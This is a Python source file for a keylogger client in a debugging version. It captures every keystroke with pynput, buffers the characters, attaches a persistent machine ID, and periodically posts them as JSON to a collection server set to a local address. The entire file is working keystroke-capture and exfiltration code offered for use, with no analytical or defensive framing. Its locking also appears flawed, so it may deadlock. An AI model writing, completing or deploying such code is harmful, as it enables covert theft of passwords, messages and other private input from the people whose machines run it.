# keylogger_client.py (DEBUGGING VERSION)
import requests
import json
import uuid
from pynput.keyboard import Listener, Key
import threading
import time
import os
import sys
import traceback # Import traceback to get detailed error info

# --- Configuration ---
SERVER_URL = "http://127.0.0.1:8000"
ID_FILE = "comp_id.txt"
SEND_INTERVAL = 6

# --- Computer ID Management ---
def get_computer_id():
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            return f.read().strip()
    else:
        new_id = str(uuid.uuid4())
        with open(ID_FILE, "w") as f:
            f.write(new_id)
        return new_id

COMPUTER_ID = get_computer_id()

# --- Keystroke Buffering and Sending ---
word_buffer = ""
buffer_lock = threading.Lock()

def send_data(data_to_send):
    if not data_to_send:
        return

    payload = {
        "comp_id": COMPUTER_ID,
        "key": data_to_send,
        "timestamp": time.time()
    }

    try:
        response = requests.post(f"{SERVER_URL}/api/keystrokes", json=payload, timeout=5)
        response.raise_for_status()
        print(f"Sent: '{data_to_send}'")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")

def process_buffer():
    global word_buffer
    with buffer_lock:
        if word_buffer:
            send_data(word_buffer)
            word_buffer = ""

def on_press(key):
    global word_buffer
    try:
        with buffer_lock:
            if hasattr(key, 'char') and key.char is not None:
                word_buffer += key.char
            elif key in [Key.space, Key.enter]:
                process_buffer()
                delimiter_name = "Space" if key == Key.space else "Enter"
                send_data(f"<{delimiter_name}>")
            elif key == Key.backspace:
                word_buffer = word_buffer[:-1]
    except Exception as e:
        # ADDED: Print the full error traceback if something goes wrong here
        print(f"[ERROR] An unhandled error occurred in on_press:")
        traceback.print_exc()

def on_release(key):
    if key == Key.esc:
        pass

# ADDED: A new function to catch lower-level pynput errors
def on_error(*args):
    print(f"\n[FATAL LISTENER ERROR] A pynput error occurred: {args}")

def start_keylogger():
    print(f"Starting keylogger client for computer ID: {COMPUTER_ID}")
    
    def periodic_sender():
        while True:
            # ADDED: A "heartbeat" to confirm the script is still running its loop
            print(f"Heartbeat: periodic sender is alive. Current buffer: '{word_buffer}'")
            time.sleep(SEND_INTERVAL)
            process_buffer()

    timer_thread = threading.Thread(target=periodic_sender, daemon=True)
    timer_thread.start()

    # MODIFIED: Added the on_error listener
    with Listener(on_press=on_press, on_release=on_release, on_error=on_error) as listener:
        print("Keylogger is running... (Press Esc to test release)")
        listener.join()
    print("Listener has stopped.")

if __name__ == "__main__":
    try:
        start_keylogger()
    except KeyboardInterrupt:
        print("\nKeylogger client stopped by user.")
        process_buffer()
        sys.exit(0)
    except Exception as e:
        print(f"\n[FATAL] A critical error occurred in the main thread: {e}")
        sys.exit(1)